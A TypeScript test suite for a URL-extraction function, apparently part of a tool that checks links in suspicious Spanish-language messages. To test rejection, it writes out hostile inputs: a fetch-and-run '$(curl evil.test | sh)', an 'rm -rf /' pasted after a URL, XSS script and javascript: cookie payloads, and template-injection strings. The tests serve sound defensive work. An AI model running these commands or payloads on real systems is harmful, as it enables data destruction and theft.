import { extractAnalysisUrl, MAX_ANALYSIS_INPUT_LENGTH } from '../analysisInput';

describe('extractAnalysisUrl', () => {
  it('accepts one direct HTTP or HTTPS URL without rewriting it', () => {
    expect(extractAnalysisUrl('  https://example.test/path?q=1#section  ')).toEqual({
      ok: true,
      url: 'https://example.test/path?q=1#section',
    });
  });

  it('extracts one URL from message text and removes sentence punctuation only', () => {
    expect(extractAnalysisUrl('Tu cuenta requiere atención. Visita https://example.test/login?next=%2Fhome).')).toEqual({
      ok: true,
      url: 'https://example.test/login?next=%2Fhome',
    });
  });

  it('rejects messages without HTTP(S) URLs', () => {
    expect(extractAnalysisUrl('Tu cuenta requiere atención.')).toEqual({ ok: false, reason: 'missing_url' });
    expect(extractAnalysisUrl('javascript:alert(1)')).toEqual({ ok: false, reason: 'missing_url' });
  });

  it('rejects multiple URLs instead of silently choosing a destination', () => {
    expect(extractAnalysisUrl('Visita https://first.example y después https://second.example')).toEqual({
      ok: false,
      reason: 'multiple_urls',
    });
  });

  it('rejects malformed and credential-bearing URLs', () => {
    expect(extractAnalysisUrl('http://')).toEqual({ ok: false, reason: 'invalid_url' });
    expect(extractAnalysisUrl('https://user:pass@example.test/')).toEqual({ ok: false, reason: 'invalid_url' });
  });

  it('enforces the Figma 480-character input limit for callers beyond the UI', () => {
    expect(MAX_ANALYSIS_INPUT_LENGTH).toBe(480);
    expect(extractAnalysisUrl(`${'x'.repeat(481)} https://example.test`)).toEqual({ ok: false, reason: 'too_long' });
  });

  it('no acepta scripts ni comandos: solo manda el enlace y rechaza enlaces con caracteres de inyección', () => {
    expect(extractAnalysisUrl('<script>alert(1)</script>')).toEqual({ ok: false, reason: 'missing_url' });
    expect(extractAnalysisUrl('javascript:alert(document.cookie)')).toEqual({ ok: false, reason: 'missing_url' });
    expect(extractAnalysisUrl('$(curl evil.test | sh)')).toEqual({ ok: false, reason: 'missing_url' });
    expect(extractAnalysisUrl('https://example.test/${7*7}')).toEqual({ ok: false, reason: 'invalid_url' });
    expect(extractAnalysisUrl('https://example.test/a|sh')).toEqual({ ok: false, reason: 'invalid_url' });
    expect(extractAnalysisUrl('https://example.test/a\\b')).toEqual({ ok: false, reason: 'invalid_url' });
    expect(extractAnalysisUrl('https://exa_mple.test/')).toEqual({ ok: false, reason: 'invalid_url' });
    expect(extractAnalysisUrl('https://example.test/\u200bcuenta')).toEqual({ ok: false, reason: 'invalid_url' });
  });

  it('de un mensaje con un comando pegado solo toma el enlace, nunca el resto del texto', () => {
    expect(extractAnalysisUrl('https://example.test/login; rm -rf /')).toEqual({ ok: true, url: 'https://example.test/login' });
    expect(extractAnalysisUrl('https://example.test/"><script>alert(1)</script>')).toEqual({ ok: true, url: 'https://example.test/' });
  });
});
